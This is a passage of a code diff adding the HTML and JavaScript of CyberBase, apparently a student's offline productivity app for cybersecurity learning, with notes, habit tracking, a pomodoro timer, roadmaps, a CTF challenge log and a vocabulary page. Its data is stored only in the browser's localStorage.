+          📱 PWA — installable on mobile<br>
+          🎨 Custom hacker UI design<br>
+          🔒 No backend, no data collection<br>
+          ⚡ Zero dependencies
+        </div>
+      </div>
+    </div>
+    <div class="card card-red" style="margin-bottom:16px;">
+      <div class="section-title">MADE BY</div>
+      <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
+        <div style="width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:22px;font-weight:900;color:var(--bg);flex-shrink:0;">Z</div>
+        <div>
+          <div class="font-orb" style="font-size:22px;color:var(--accent);letter-spacing:2px;">ZATCH</div>
+          <div class="font-mono" style="font-size:11px;color:var(--text2);margin-top:4px;letter-spacing:1px;">BTech Computer Engineering · Cybersecurity</div>
+          <div style="font-size:13px;color:var(--text);margin-top:8px;line-height:1.6;">Cybersecurity student building tools, learning by doing, and documenting the journey. CyberBase was built as a personal productivity tool and portfolio project — designed for anyone serious about their cyber learning path.</div>
+        </div>
+      </div>
+    </div>
+    <div class="card" style="text-align:center;">
+      <div class="font-mono" style="font-size:11px;color:var(--text2);letter-spacing:2px;margin-bottom:16px;">OPEN SOURCE · FREE FOREVER · USE IT, SHARE IT</div>
+      <button class="btn btn-sm" data-page="notes" onclick="showPage('notes')" style="margin-bottom:20px;">START USING THE APP →</button>
+      <div style="width:60px;height:1px;background:var(--border);margin:0 auto 20px;"></div>
+      <div class="font-mono" style="font-size:10px;color:var(--text2);letter-spacing:2px;margin-bottom:12px;">DATA MANAGEMENT</div>
+      <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
+        <button onclick="backupData()" style="background:rgba(0,255,136,0.08);border:1px solid var(--accent);color:var(--accent);font-family:'Share Tech Mono',monospace;font-size:11px;padding:8px 18px;border-radius:4px;cursor:pointer;letter-spacing:1px;" onmouseover="this.style.background='rgba(0,255,136,0.18)'" onmouseout="this.style.background='rgba(0,255,136,0.08)'">💾 BACKUP DATA</button>
+        <label style="background:rgba(0,196,255,0.08);border:1px solid var(--accent2);color:var(--accent2);font-family:'Share Tech Mono',monospace;font-size:11px;padding:8px 18px;border-radius:4px;cursor:pointer;letter-spacing:1px;" onmouseover="this.style.background='rgba(0,196,255,0.18)'" onmouseout="this.style.background='rgba(0,196,255,0.08)'">📂 RESTORE DATA<input type="file" accept=".json" onchange="restoreData(event)" style="display:none;"></label>
+        <button onclick="resetAllData()" style="background:rgba(255,77,109,0.08);border:1px solid var(--accent3);color:var(--accent3);font-family:'Share Tech Mono',monospace;font-size:11px;padding:8px 18px;border-radius:4px;cursor:pointer;letter-spacing:1px;" onmouseover="this.style.background='rgba(255,77,109,0.2)'" onmouseout="this.style.background='rgba(255,77,109,0.08)'">⚠ RESET EVERYTHING</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- =================== NOTES PAGE =================== -->
+<div class="page active" id="page-notes">
+  <div class="notes-toolbar">
+    <input type="text" id="noteSearch" placeholder="search notes..." oninput="renderNotes()">
+    <div class="note-type-tabs">
+      <button class="note-type-tab active" onclick="filterNotes('all',this)">ALL</button>
+      <button class="note-type-tab" onclick="filterNotes('note',this)">NOTES</button>
+      <button class="note-type-tab" onclick="filterNotes('checklist',this)">CHECKLISTS</button>
+    </div>
+    <button class="btn btn-sm" onclick="openNoteModal()">+ NEW NOTE</button>
+    <button class="btn btn-sm btn-blue" onclick="openChecklistModal()">+ CHECKLIST</button>
+  </div>
+  <div class="notes-grid" id="notesGrid"></div>
+</div>
+
+<!-- =================== HABITS PAGE =================== -->
+<div class="page" id="page-habits">
+  <div class="habits-top">
+    <div>
+      <div class="section-title">HABIT TRACKER</div>
+      <div class="streak-summary" id="streakSummary"></div>
+    </div>
+    <button class="btn" onclick="openHabitModal()">+ ADD HABIT</button>
+  </div>
+  <div id="habitsGrid"></div>
+</div>
+
+<!-- =================== POMODORO PAGE =================== -->
+<div class="page" id="page-pomodoro">
+  <div style="display:flex;justify-content:center;">
+    <div class="pomo-center" style="max-width:400px;width:100%;">
+      <div class="section-title" style="width:100%">POMODORO TIMER</div>
+      <div class="pomo-modes">
+        <button class="pomo-mode-btn active" data-mode="focus" onclick="setPomoMode('focus')">FOCUS</button>
+        <button class="pomo-mode-btn" data-mode="short" onclick="setPomoMode('short')">SHORT BREAK</button>
+        <button class="pomo-mode-btn" data-mode="long" onclick="setPomoMode('long')">LONG BREAK</button>
+      </div>
+      <div class="pomo-ring-wrap">
+        <svg class="pomo-ring" width="280" height="280" viewBox="0 0 280 280">
+          <circle class="pomo-ring-bg" cx="140" cy="140" r="124"/>
+          <circle class="pomo-ring-fill" id="pomoRing" cx="140" cy="140" r="124"
+            stroke="#00ff88"
+            stroke-dasharray="779"
+            stroke-dashoffset="0"/>
+        </svg>
+        <div class="pomo-time">
+          <div class="pomo-digits" id="pomoTime">25:00</div>
+          <div class="pomo-mode-label" id="pomoModeLabel">FOCUS SESSION</div>
+          <div class="pomo-session" id="pomoSession">SESSION #0</div>
+        </div>
+      </div>
+      <div class="pomo-controls">
+        <button class="pomo-btn-big" id="pomoPlayBtn" onclick="togglePomo()">▶</button>
+        <button class="pomo-btn-big stop" onclick="stopPomo()">■</button>
+      </div>
+      <div class="pomo-settings">
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">FOCUS</div>
+          <input class="pomo-set-input" type="number" id="setWork" value="25" min="1" max="90" onchange="updatePomoSettings()">
+        </div>
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">SHORT BRK</div>
+          <input class="pomo-set-input" type="number" id="setShort" value="5" min="1" max="30" onchange="updatePomoSettings()">
+        </div>
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">LONG BRK</div>
+          <input class="pomo-set-input" type="number" id="setLong" value="15" min="1" max="60" onchange="updatePomoSettings()">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- =================== ROADMAP PAGE =================== -->
+<div class="page" id="page-roadmap">
+  <div id="rmListView">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:12px;">
+      <div class="section-title" style="margin:0;flex:1">MY ROADMAPS</div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        <button class="btn btn-blue btn-sm" onclick="openTemplateModal()">📋 USE A TEMPLATE</button>
+        <button class="btn btn-sm" onclick="openManualRoadmapModal()">✏ BUILD MANUALLY</button>
+      </div>
+    </div>
+    <div id="rmGrid"></div>
+  </div>
+  <div id="rmDetailView" style="display:none;">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+      <button class="btn btn-ghost btn-sm" onclick="backToRoadmapList()">← BACK</button>
+      <div class="section-title" style="margin:0;flex:1" id="rmDetailTitle"></div>
+      <button class="btn btn-red btn-sm" id="rmDeleteBtn">🗑 DELETE</button>
+    </div>
+    <div id="rmDetailProgress" style="margin-bottom:16px;"></div>
+    <div class="roadmap-timeline" id="rmDetailContent"></div>
+  </div>
+</div>
+
+<!-- TEMPLATE PICKER MODAL -->
+<div class="modal-overlay hidden" id="templateModal">
+  <div class="modal" style="width:800px;max-height:90vh;">
+    <div class="modal-title">📋 CHOOSE A ROADMAP TEMPLATE</div>
+    <button class="modal-close" onclick="closeModal('templateModal')">✕</button>
+    <div class="font-mono text-muted mb-12" style="font-size:11px;letter-spacing:1px;">10 READY-MADE ROADMAPS — CLICK ANY TO ADD IT</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;max-height:65vh;overflow-y:auto;padding-right:4px;" id="templateGrid"></div>
+  </div>
+</div>
+
+<!-- MANUAL BUILD MODAL -->
+<div class="modal-overlay hidden" id="manualRoadmapModal">
+  <div class="modal" style="width:700px;max-height:90vh;">
+    <div class="modal-title">✏ BUILD YOUR ROADMAP</div>
+    <button class="modal-close" onclick="closeModal('manualRoadmapModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">ROADMAP TITLE</label>
+      <input type="text" id="manualRmTitle" placeholder="e.g. My Python Journey, OSCP Prep, Web Dev Path...">
+    </div>
+    <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+      <label class="form-label" style="margin:0">PHASES / MILESTONES</label>
+      <button class="btn btn-sm btn-blue" onclick="addManualPhase()">+ ADD PHASE</button>
+    </div>
+    <div id="manualPhases" style="max-height:400px;overflow-y:auto;padding-right:4px;"></div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveManualRoadmap()">SAVE ROADMAP</button>
+      <button class="btn btn-ghost" onclick="closeModal('manualRoadmapModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<!-- =================== CTF TRACKER =================== -->
+<div class="page" id="page-ctf">
+  <div class="section-title">CTF TRACKER</div>
+  <div class="ctf-stats" id="ctfStats"></div>
+
+  <div class="add-ctf-form card">
+    <div class="font-mono text-muted mb-8" style="font-size:11px; letter-spacing:1px;">LOG A CTF / CHALLENGE</div>
+    <div class="form-inline">
+      <div class="form-row"><input type="text" id="ctfName" placeholder="Challenge name..." /></div>
+      <div class="form-row" style="flex:0 0 140px;">
+        <select id="ctfPlatform">
+          <option value="TryHackMe">TryHackMe</option>
+          <option value="HackTheBox">HackTheBox</option>
+          <option value="PortSwigger">PortSwigger</option>
+          <option value="PicoCTF">PicoCTF</option>
+          <option value="CTFtime">CTFtime</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+      <div class="form-row" style="flex:0 0 120px;">
+        <select id="ctfDiff">
+          <option value="easy">Easy</option>
+          <option value="medium">Medium</option>
+          <option value="hard">Hard</option>
+        </select>
+      </div>
+      <div class="form-row" style="flex:0 0 100px;">
+        <input type="number" id="ctfPoints" placeholder="Points" min="0" max="9999">
+      </div>
+      <div class="form-row" style="flex:0 0 120px;">
+        <select id="ctfCategory">
+          <option value="Web">Web</option>
+          <option value="Network">Network</option>
+          <option value="Crypto">Crypto</option>
+          <option value="Forensics">Forensics</option>
+          <option value="Pwn">Pwn</option>
+          <option value="OSINT">OSINT</option>
+          <option value="Misc">Misc</option>
+        </select>
+      </div>
+      <button class="btn btn-sm" onclick="addCTF()">LOG IT</button>
+    </div>
+    <div class="form-row mt-8">
+      <input type="text" id="ctfNotes" placeholder="Notes / writeup summary...">
+    </div>
+  </div>
+
+  <div class="section-title">SOLVED CHALLENGES</div>
+  <div id="ctfList"></div>
+</div>
+
+<!-- =================== VOCAB / REFERENCE PAGE =================== -->
+<div class="page" id="page-vocab">
+  <div class="section-title">CYBER VOCABULARY & TOOLS REFERENCE</div>
+  <div class="vocab-search">
+    <input type="text" id="vocabSearch" placeholder="search 500+ terms, tools, concepts..." oninput="renderVocab()">
+    <select id="vocabCatFilter" onchange="renderVocab()" style="width:auto;min-width:150px;">
+      <option value="all">ALL CATEGORIES</option>
+      <option value="networking">Networking</option>
+      <option value="web">Web Hacking</option>
+      <option value="linux">Linux</option>
+      <option value="tools">Tools</option>
+      <option value="general">General</option>
+      <option value="crypto">Cryptography</option>
+      <option value="forensics">Forensics</option>
+      <option value="malware">Malware</option>
+    </select>
+    <button class="btn btn-sm btn-blue" onclick="openVocabModal()">+ ADD TERM</button>
+  </div>
+  <div class="vocab-grid" id="vocabGrid"></div>
+</div>
+
+</div><!-- end .main -->
+
+<!-- =================== MODALS =================== -->
+<div class="modal-overlay hidden" id="noteModal">
+  <div class="modal">
+    <div class="modal-title" id="noteModalTitle">NEW NOTE</div>
+    <button class="modal-close" onclick="closeModal('noteModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">TITLE</label>
+      <input type="text" id="noteTitle" placeholder="Note title...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">CONTENT</label>
+      <textarea id="noteBody" placeholder="Write your note..." rows="6"></textarea>
+    </div>
+    <div class="form-row-inline">
+      <div class="form-row" style="flex:1">
+        <label class="form-label">TAG</label>
+        <select id="noteTag">
+          <option value="general">General</option>
+          <option value="web">Web Hacking</option>
+          <option value="linux">Linux</option>
+          <option value="networking">Networking</option>
+          <option value="tool">Tool</option>
+          <option value="important">Important</option>
+        </select>
+      </div>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveNote()">SAVE NOTE</button>
+      <button class="btn btn-ghost" onclick="closeModal('noteModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="checklistModal">
+  <div class="modal">
+    <div class="modal-title">NEW CHECKLIST</div>
+    <button class="modal-close" onclick="closeModal('checklistModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">CHECKLIST TITLE</label>
+      <input type="text" id="clTitle" placeholder="Checklist title...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">ITEMS</label>
+      <ul class="checklist-items" id="clItems"></ul>
+      <div class="add-check-row">
+        <input type="text" id="clNewItem" placeholder="Add item..." onkeydown="if(event.key==='Enter')addClItem()">
+        <button class="btn btn-sm btn-blue" onclick="addClItem()">ADD</button>
+      </div>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveChecklist()">SAVE LIST</button>
+      <button class="btn btn-ghost" onclick="closeModal('checklistModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="habitModal">
+  <div class="modal">
+    <div class="modal-title">NEW HABIT</div>
+    <button class="modal-close" onclick="closeModal('habitModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">HABIT NAME</label>
+      <input type="text" id="habitName" placeholder="e.g. Daily TryHackMe, Linux practice...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">CATEGORY</label>
+      <select id="habitCat">
+        <option value="cyber">Cybersecurity</option>
+        <option value="study">Study</option>
+        <option value="practice">Practice</option>
+        <option value="fitness">Fitness</option>
+        <option value="misc">Misc</option>
+      </select>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveHabit()">ADD HABIT</button>
+      <button class="btn btn-ghost" onclick="closeModal('habitModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="viewNoteModal">
+  <div class="modal">
+    <div class="modal-title" id="viewNoteTitle"></div>
+    <button class="modal-close" onclick="closeModal('viewNoteModal')">✕</button>
+    <div id="viewNoteBody"></div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="vocabModal">
+  <div class="modal">
+    <div class="modal-title">ADD VOCAB / TERM</div>
+    <button class="modal-close" onclick="closeModal('vocabModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">TERM / TOOL NAME</label>
+      <input type="text" id="vocabTerm" placeholder="e.g. SQL Injection, Burp Suite...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">DEFINITION / DESCRIPTION</label>
+      <textarea id="vocabDef" placeholder="Explain what it is / how to use it..." rows="4"></textarea>
+    </div>
+    <div class="form-row">
+      <label class="form-label">CATEGORY</label>
+      <select id="vocabCat">
+          <option value="web">Web Hacking</option>
+          <option value="networking">Networking</option>
+          <option value="linux">Linux</option>
+          <option value="tools">Tools</option>
+          <option value="general">General</option>
+          <option value="crypto">Cryptography</option>
+          <option value="forensics">Forensics</option>
+          <option value="malware">Malware</option>
+        </select>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveVocab()">SAVE</button>
+      <button class="btn btn-ghost" onclick="closeModal('vocabModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// =================== STORE ===================
+let store = { notes:[], habits:[], ctf:[], vocab:[], pomoLog:[], roadmaps:[] };
+
+function save() { localStorage.setItem('cyberbase', JSON.stringify(store)); }
+function load() {
+  const d = localStorage.getItem('cyberbase');
+  if (d) { try { Object.assign(store, JSON.parse(d)); } catch(e) {} }
+  if (!store.notes) store.notes = [];
+  if (!store.habits) store.habits = [];
+  if (!store.ctf) store.ctf = [];
+  if (!store.vocab || store.vocab.length < 700) store.vocab = getDefaultVocab();
+  if (!store.pomoLog) store.pomoLog = [];
+  if (!store.roadmaps) store.roadmaps = [];
+}
+
+// =================== UI HELPERS ===================
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.mobile-nav-btn').forEach(b => b.classList.remove('active'));
+  const page = document.getElementById('page-' + name);
+  if (page) page.classList.add('active');
+  const btn = document.querySelector('.nav-btn[data-page="' + name + '"]');
+  if (btn) btn.classList.add('active');
+  const mbtn = document.querySelector('.mobile-nav-btn[data-page="' + name + '"]');
+  if (mbtn) mbtn.classList.add('active');
+  if (name === 'notes') renderNotes();
+  if (name === 'habits') renderHabits();
+  if (name === 'roadmap') renderRoadmapList();
+  if (name === 'ctf') renderCTF();
+  if (name === 'vocab') renderVocab();
+  if (name === 'pomodoro') renderPomoLog();
+}
+function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
+function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+function toast(msg, color) {
+  color = color || '#00ff88';
+  const t = document.createElement('div');
+  t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:#0f1319;border:1px solid ' + color + ';color:' + color + ';padding:10px 18px;font-family:"Share Tech Mono",monospace;font-size:12px;letter-spacing:1px;border-radius:4px;z-index:9999;animation:fadeIn .2s;';
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 2800);
+}
+function escH(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+// =================== MOBILE NAV ===================
+function openMobileNav() {
+  document.getElementById('mobileNavDrawer').classList.add('open');
+  document.getElementById('mobileNavOverlay').classList.add('open');
+}
+function closeMobileNav() {
+  document.getElementById('mobileNavDrawer').classList.remove('open');
+  document.getElementById('mobileNavOverlay').classList.remove('open');
+}
+
+// clock — update both desktop and mobile
+setInterval(() => {
+  const d = new Date();
+  const t = d.toTimeString().slice(0,8);
+  const el = document.getElementById('clockDisplay');
+  const mel = document.getElementById('mobileClockDisplay');
+  if (el) el.textContent = t;
+  if (mel) mel.textContent = t;
+}, 1000);
+
+// =================== NOTES ===================
+let noteFilter = 'all';
+function filterNotes(type, btn) {
+  noteFilter = type;
+  document.querySelectorAll('.note-type-tab').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  renderNotes();
+}
+function renderNotes() {
+  const q = (document.getElementById('noteSearch').value || '').toLowerCase();
+  let items = store.notes.filter(n => {
+    if (noteFilter === 'note' && n.type !== 'note') return false;
+    if (noteFilter === 'checklist' && n.type !== 'checklist') return false;
+    if (q && !n.title.toLowerCase().includes(q) && !(n.body||'').toLowerCase().includes(q)) return false;
+    return true;
+  });
+  const grid = document.getElementById('notesGrid');
+  if (!items.length) { grid.innerHTML = '<div class="empty-state"><div class="empty-icon">📝</div>NO NOTES YET — CREATE YOUR FIRST ONE</div>'; return; }
+  const tagColors = { web:'tag-red', linux:'tag-green', networking:'tag-blue', tool:'tag-gold', important:'tag-red', general:'tag-blue' };
+  grid.innerHTML = items.map(n => {
+    if (n.type === 'checklist') {
+      const done = (n.items||[]).filter(i=>i.done).length;
+      const total = (n.items||[]).length;
+      return '<div class="note-card" onclick="viewNote(' + n.id + ')"><div class="note-card-header"><span class="note-tag tag ' + (tagColors[n.tag]||'tag-blue') + '">' + n.tag + '</span><span class="font-mono text-muted" style="font-size:10px;">CHECKLIST</span></div><div class="note-title">' + escH(n.title) + '</div><div class="font-mono text-muted" style="font-size:11px;margin-top:8px;">' + done + '/' + total + ' DONE</div><div class="note-date">' + n.date + '</div></div>';
+    }
+    return '<div class="note-card" onclick="viewNote(' + n.id + ')"><div class="note-card-header"><span class="note-tag tag ' + (tagColors[n.tag]||'tag-blue') + '">' + n.tag + '</span></div><div class="note-title">' + escH(n.title) + '</div><div class="note-preview">' + escH((n.body||'').slice(0,100)) + '</div><div class="note-date">' + n.date + '</div></div>';
+  }).join('');
+}
+function openNoteModal(id) {
+  const n = id ? store.notes.find(x=>x.id===id) : null;
+  document.getElementById('noteModalTitle').textContent = n ? 'EDIT NOTE' : 'NEW NOTE';
+  document.getElementById('noteTitle').value = n ? n.title : '';
+  document.getElementById('noteBody').value = n ? (n.body||'') : '';
+  document.getElementById('noteTag').value = n ? n.tag : 'general';
+  document.getElementById('noteModal').dataset.editId = n ? n.id : '';
+  openModal('noteModal');
+}
+function saveNote() {
+  const title = document.getElementById('noteTitle').value.trim();
+  if (!title) { toast('> title required', '#ff4d6d'); return; }
+  const editId = parseInt(document.getElementById('noteModal').dataset.editId);
+  if (editId) {
+    const n = store.notes.find(x=>x.id===editId);
+    if (n) { n.title = title; n.body = document.getElementById('noteBody').value; n.tag = document.getElementById('noteTag').value; }
+  } else {
+    store.notes.unshift({ id: Date.now(), title, body: document.getElementById('noteBody').value, tag: document.getElementById('noteTag').value, type:'note', date: new Date().toLocaleDateString() });
+  }
+  save(); closeModal('noteModal'); renderNotes(); toast('> NOTE SAVED');
+}
+function viewNote(id) {
+  const n = store.notes.find(x=>x.id===id);
+  if (!n) return;
+  if (n.type === 'checklist') { openChecklistView(id); return; }
+  openNoteModal(id);
+}
+function deleteNote(id) {
+  store.notes = store.notes.filter(n=>n.id!==id);
+  save(); closeModal('noteViewModal'); renderNotes(); toast('> DELETED','#ff4d6d');
+}
+
+// Checklist
+function openChecklistModal() {
+  document.getElementById('clTitle').value = '';
+  document.getElementById('clItems').innerHTML = '';
+  addClItem();
+  openModal('checklistModal');
+}
+function addClItem() {
+  const div = document.createElement('div');
+  div.style.cssText = 'display:flex;gap:8px;margin-bottom:6px;';
+  div.innerHTML = '<input type="text" placeholder="Task..." style="flex:1;font-size:13px;"><button class="icon-btn" onclick="this.parentElement.remove()">✕</button>';
+  document.getElementById('clItems').appendChild(div);
+}
+function saveChecklist() {
+  const title = document.getElementById('clTitle').value.trim();
+  if (!title) { toast('> title required','#ff4d6d'); return; }
+  const items = [...document.querySelectorAll('#clItems input')].map(i=>i.value.trim()).filter(Boolean).map(t=>({text:t,done:false}));
+  store.notes.unshift({ id:Date.now(), title, items, type:'checklist', tag: 'general', date: new Date().toLocaleDateString() });
+  save(); closeModal('checklistModal'); renderNotes(); toast('> CHECKLIST SAVED');
+}
+function openChecklistView(id) {
+  const n = store.notes.find(x=>x.id===id);
+  if (!n) return;
+  document.getElementById('clViewTitle').textContent = n.title;
+  renderClView(n);
+  document.getElementById('clViewModal').dataset.id = id;
+  openModal('clViewModal');
+}
+function renderClView(n) {
+  const done = (n.items||[]).filter(i=>i.done).length;
+  const total = (n.items||[]).length;
+  const pct = total ? Math.round(done/total*100) : 0;
+  let html = '<div style="margin-bottom:12px;"><div class="habit-progress-bar"><div class="habit-progress-fill" style="width:'+pct+'%"></div></div><div class="font-mono text-muted" style="font-size:11px;margin-top:4px;">'+done+'/'+total+' DONE</div></div>';
+  html += (n.items||[]).map((item,i) => '<div class="phase-task ' + (item.done?'done':'') + '" style="margin-bottom:6px;" onclick="toggleClItem('+n.id+','+i+',this)"><div class="task-check">'+(item.done?'✓':'')+'</div><span>'+escH(item.text)+'</span></div>').join('');
+  document.getElementById('clViewItems').innerHTML = html;
+}
+function toggleClItem(id, idx, el) {
+  const n = store.notes.find(x=>x.id===id);
+  if (!n) return;
+  n.items[idx].done = !n.items[idx].done;
+  save(); renderClView(n); renderNotes();
+}
+function deleteChecklist() {
+  const id = parseInt(document.getElementById('clViewModal').dataset.id);
+  store.notes = store.notes.filter(n=>n.id!==id);
+  save(); closeModal('clViewModal'); renderNotes(); toast('> DELETED','#ff4d6d');
+}
+
+// =================== HABITS ===================
+function renderHabits() {
+  const today = new Date().toDateString();
+  const summary = document.getElementById('streakSummary');
+  if (summary) {
+    const active = store.habits.filter(h=>h.streak>0).length;
+    summary.innerHTML = '<span style="color:var(--accent4)">'+store.habits.length+'</span> HABITS &nbsp;|&nbsp; <span style="color:var(--accent)">'+active+'</span> ACTIVE STREAKS';
+  }
+  const grid = document.getElementById('habitsGrid');
+  if (!grid) return;
+  if (!store.habits.length) { grid.innerHTML='<div class="empty-state"><div class="empty-icon">🔥</div>NO HABITS YET</div>'; return; }
+  const catColors = { cyber:'tag-red', study:'tag-blue', practice:'tag-gold', fitness:'tag-green', misc:'tag-blue' };
+  grid.innerHTML = store.habits.map(h => {
+    const doneToday = h.lastDone === today;
+    const hist = h.history || [];
+    const last30 = [];
+    for (let i=29; i>=0; i--) { const d = new Date(); d.setDate(d.getDate()-i); last30.push(hist.includes(d.toDateString()) ? 1 : 0); }
+    const rate = Math.round(last30.filter(Boolean).length/30*100);
+    return '<div class="habit-card">' +
+      '<div style="display:flex;justify-content:space-between;align-items:flex-start;">' +
+        '<div><div class="habit-name">'+escH(h.name)+'</div>' +
+        '<div style="display:flex;gap:6px;margin-top:4px;align-items:center;"><span class="tag '+(catColors[h.cat]||'tag-blue')+'">'+h.cat+'</span><span class="font-mono text-muted" style="font-size:10px;">BEST: '+h.best+'d</span></div></div>' +
+        '<div style="text-align:right;"><div style="font-family:\'Orbitron\',monospace;font-size:28px;color:var(--accent4);font-weight:900;line-height:1;">'+h.streak+'</div><div class="font-mono text-muted" style="font-size:10px;">🔥 DAY STREAK</div></div>' +
+      '</div>' +
+      '<div class="habit-progress-bar" style="margin-top:12px;"><div class="habit-progress-fill" style="width:'+rate+'%"></div></div>' +
+      '<div style="display:flex;justify-content:space-between;margin-top:8px;align-items:center;">' +
+        '<span class="font-mono text-muted" style="font-size:10px;">'+rate+'% COMPLETION (30d)</span>' +
+        '<div style="display:flex;gap:6px;">' +
+          '<button class="btn btn-sm '+(doneToday?'':'btn-blue')+'" onclick="markHabit('+h.id+')" '+(doneToday?'disabled style="opacity:.5"':'')+'>'+( doneToday?'✓ DONE TODAY':'MARK DONE')+'</button>' +
+          '<button class="icon-btn" onclick="deleteHabit('+h.id+')">🗑</button>' +
+        '</div>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+}
+function openHabitModal() {
+  document.getElementById('habitName').value = '';
+  document.getElementById('habitCat').value = 'cyber';
+  openModal('habitModal');
+}
+function markHabit(id) {
+  const h = store.habits.find(x=>x.id===id);
+  if (!h) return;
+  const today = new Date().toDateString();
+  if (h.lastDone === today) return;
+  if (!h.history) h.history = [];
+  h.history.push(today);
+  const yesterday = new Date(); yesterday.setDate(yesterday.getDate()-1);
+  h.streak = (h.lastDone === yesterday.toDateString()) ? h.streak+1 : 1;
+  h.best = Math.max(h.best||0, h.streak);
+  h.lastDone = today;
+  save(); renderHabits(); toast('> HABIT MARKED ✓ 🔥');
+}
+function deleteHabit(id) {
+  store.habits = store.habits.filter(h=>h.id!==id);
+  save(); renderHabits(); toast('> HABIT REMOVED','#ff4d6d');
+}
+function saveHabit() {
+  const name = document.getElementById('habitName').value.trim();
+  if (!name) { toast('> name required','#ff4d6d'); return; }
+  store.habits.push({ id:Date.now(), name, cat: document.getElementById('habitCat').value, streak:0, best:0, history:[], lastDone:null });
+  save(); closeModal('habitModal'); renderHabits(); toast('> HABIT ADDED');
+}
+
+// =================== POMODORO ===================
+let pomoState = { mode:'focus', running:false, timeLeft:25*60, session:0, interval:null };
+const POMO_DURATIONS = { focus:25*60, short:5*60, long:15*60 };
+
+function setPomoMode(mode) {
+  clearInterval(pomoState.interval);
+  pomoState.running = false;
+  pomoState.mode = mode;
+  pomoState.timeLeft = POMO_DURATIONS[mode];
+  updatePomoDisplay();
+  document.querySelectorAll('.pomo-mode-btn').forEach(b => b.classList.remove('active'));
+  const btn = document.querySelector('.pomo-mode-btn[data-mode="'+mode+'"]');
+  if (btn) btn.classList.add('active');
+}
+function updatePomoDisplay() {
+  const m = Math.floor(pomoState.timeLeft/60);
+  const s = pomoState.timeLeft%60;
+  const el = document.getElementById('pomoTime');
+  if (el) el.textContent = String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  // SVG ring — radius 124, circumference = 2*PI*124 ≈ 779
+  const ring = document.getElementById('pomoRing');
+  if (ring) {
+    const total = POMO_DURATIONS[pomoState.mode];
+    const pct = pomoState.timeLeft/total;
+    const circ = 2*Math.PI*124;
+    ring.style.strokeDasharray = circ;
+    ring.style.strokeDashoffset = circ*(1-pct);
+    const colors = { focus:'#00ff88', short:'#00c4ff', long:'#a855f7' };
+    ring.style.stroke = colors[pomoState.mode]||'#00ff88';
+  }
+  const label = document.getElementById('pomoModeLabel');
+  if (label) label.textContent = { focus:'FOCUS', short:'SHORT BREAK', long:'LONG BREAK' }[pomoState.mode];
+}
+function togglePomo() {
+  if (pomoState.running) {
+    clearInterval(pomoState.interval);
+    pomoState.running = false;
+    document.getElementById('pomoPlayBtn').innerHTML = '▶';
+  } else {
+    pomoState.running = true;
+    document.getElementById('pomoPlayBtn').innerHTML = '⏸';
+    pomoState.interval = setInterval(() => {
+      pomoState.timeLeft--;
+      updatePomoDisplay();
+      if (pomoState.timeLeft <= 0) {
+        clearInterval(pomoState.interval);
+        pomoState.running = false;
+        // Only log completed sessions
+        if (pomoState.mode === 'focus') {
+          pomoState.session++;
+          logPomoSession(POMO_DURATIONS.focus / 60);
+          const sesEl = document.getElementById('pomoSession');
+          if (sesEl) sesEl.textContent = 'SESSION #' + pomoState.session;
+        }
+        playBeep();
+        toast('> SESSION COMPLETE 🎯');
+        document.getElementById('pomoPlayBtn').innerHTML = '▶';
+        // auto switch
+        if (pomoState.mode === 'focus') {
+          setPomoMode(pomoState.session % 4 === 0 ? 'long' : 'short');
+        } else {
+          setPomoMode('focus');
+        }
+      }
+    }, 1000);
+  }
+}
+function stopPomo() {
+  clearInterval(pomoState.interval);
+  pomoState.running = false;
+  // Do NOT log when stopped — only log completed sessions
+  setPomoMode(pomoState.mode);
+  document.getElementById('pomoPlayBtn').innerHTML = '▶';
+}
+function skipPomo() {
